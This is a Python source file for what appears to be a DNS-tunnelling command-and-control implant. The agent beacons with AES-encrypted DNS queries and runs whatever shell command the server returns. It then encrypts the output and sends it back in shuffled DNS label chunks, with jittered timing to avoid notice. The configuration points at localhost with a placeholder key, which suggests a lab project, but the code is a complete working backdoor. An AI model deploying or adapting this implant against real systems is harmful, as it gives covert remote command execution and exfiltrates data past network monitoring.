import json
import time
import base64
import random
import socket
import subprocess

from Crypto.Cipher import AES
from dnslib import DNSRecord, QTYPE
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

AGENT_ID = "agent-uuid-0000"

SEND_ACTION = 'send'
CALLBACK_ACTION = 'callback'

NO_TASK_RESPONSE = "[NOTHING]"

IV_SIZE = 16
AES_KEY = b"0123456789abcdef"

EDNS0 = 4096
RR_TYPE = "AAAA"
CHUNK_LABEL_SIZE = 48


PORT = 5353
SERVER = "127.0.0.1"
DOMAIN = "domain.local"

JITTER = 1
BASE_INTERVAL = 3

def generate_random_interval(interval, jitter):
    lower_limit = interval - jitter
    upper_limit = interval + jitter
    new_interval = random.randint(lower_limit, upper_limit)
    
    return new_interval

def b64_encode(data_bytes: bytes):
    return base64.urlsafe_b64encode(data_bytes).rstrip(b"=").decode()

def b64_decode(s: str) -> bytes:
    padding = '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)

def encrypt_aes_cbc(key: bytes, plaintext: bytes) -> bytes:
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return iv + ciphertext


def encrypt_string(key: bytes, plaintext: str) -> str:

    if not isinstance(plaintext, str):
        raise TypeError("plaintext debe ser string")
    
    data = plaintext.encode("utf-8")
    iv = get_random_bytes(IV_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphered = cipher.encrypt(pad(data, AES.block_size))
    encrypted_blob = iv + ciphered
    return b64_encode(encrypted_blob)

def decrypt_aes_cbc(key: bytes, iv_ct: bytes) -> bytes:
    if len(iv_ct) < 16:
        raise ValueError("iv_ct demasiado corto")
    iv = iv_ct[:16]
    ct = iv_ct[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def build_requests(agent_id:str, message_id:int, action:str, data= ''):

    envelope = {
        "agent_id": agent_id,
        "messgae_id": message_id,
        "action": action
    }

    encoded_data = b64_encode(data.encode('utf-8'))
    total_size = len(encoded_data)

    chunks = chunk_data(encoded_data, total_size)

    fqdns = []
    for idx, chunk in enumerate(chunks):
        chunk_envelope = {
            "agent_id": AGENT_ID,
            "message_id": message_id,
            "chunk_index": idx,
            "size": total_size,
            "data": chunk
        }

        envelope_json = json.dumps(chunk_envelope, separators=(",", ":"), ensure_ascii=False).encode()
        envelope_iv_ct = encrypt_aes_cbc(AES_KEY, envelope_json)
        envelope_b64 = b64_encode(envelope_iv_ct)

        limit = 63

        labels = [envelope_b64[i:i + limit] for i in range(0, len(envelope_b64), limit)]
        fqdn = ".".join(labels)

        fqdns.append(f"{fqdn}.{DOMAIN}")

    random.shuffle(fqdns)

    return fqdns

def chunk_data(data, total_size):
    chunks = [data[i:i+CHUNK_LABEL_SIZE] for i in range(0, total_size, CHUNK_LABEL_SIZE)]

    return chunks

def time_based_wait():
    interval = generate_random_interval(BASE_INTERVAL, JITTER)
    print(f'await for {interval} seconds', "\n [......]\n")
    time.sleep(interval)
    return True

def execute_command(command_string: str) -> str:
    try:
        result = subprocess.run(
            command_string, 
            shell=True, 
            capture_output=True, 
            text=True, 
            check=True 
        )
        return result.stdout.strip() 
    except subprocess.CalledProcessError as e:
        print(f"Command failed with exit code {e.returncode}")
        print(f"Standard Error: {e.stderr}")
        return f"error executing {command_string}"
    except FileNotFoundError:
        try:
            command_name = command_string.split()[0]
        except IndexError:
            command_name = command_string
            
        print(f"Error: Command not found or invalid path: {command_name}")
        return f"error executing {command_string}"


def send_bulk(requests):
    for request in requests:
        response = send_request(request)

    return True

def build_callback(agent_id):
    encrypted = encrypt_string(AES_KEY, agent_id)

    request = f"{encrypted}.{DOMAIN}"

    return request

def decode_response(response):
    formated_responses = [b.decode('utf-8') for b in response]
    decoded_data = b64_decode("".join(formated_responses))
    decrypted_data = decrypt_aes_cbc(AES_KEY, decoded_data)
    decoded_response = decrypted_data.decode()
    return decoded_response

def send_request(request):
    timeout = 10
    q = DNSRecord.question(request, RR_TYPE)
    packet = q.pack()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    sock.sendto(packet, (SERVER, PORT))

    try:
        data, _ = sock.recvfrom(EDNS0)
        reply = DNSRecord.parse(data)

        for rr in reply.rr:
            if rr.rtype == QTYPE.TXT:
                response_data = rr.rdata.data
                decoded_response = decode_response(response_data)
                return decoded_response
        return None
    
    except socket.timeout:
        print("[X] Timeout error from DNS server")
        return None
    finally:
        sock.close()

def init():
    while True:
        callback_request = build_callback(AGENT_ID)
        time_based_wait()
        callback_response = send_request(callback_request)

        if callback_response == None:
            continue


        if callback_response == NO_TASK_RESPONSE:
            print(NO_TASK_RESPONSE)
            continue
        
        message_id, task = callback_response.split(":")

        task_result = execute_command(task)

        if task_result == "":
            task_result = "DONE"


        requests = build_requests(AGENT_ID, message_id, SEND_ACTION, task_result)
        time_based_wait()
        send_bulk(requests)

    return True

if __name__ == "__main__":

    init()

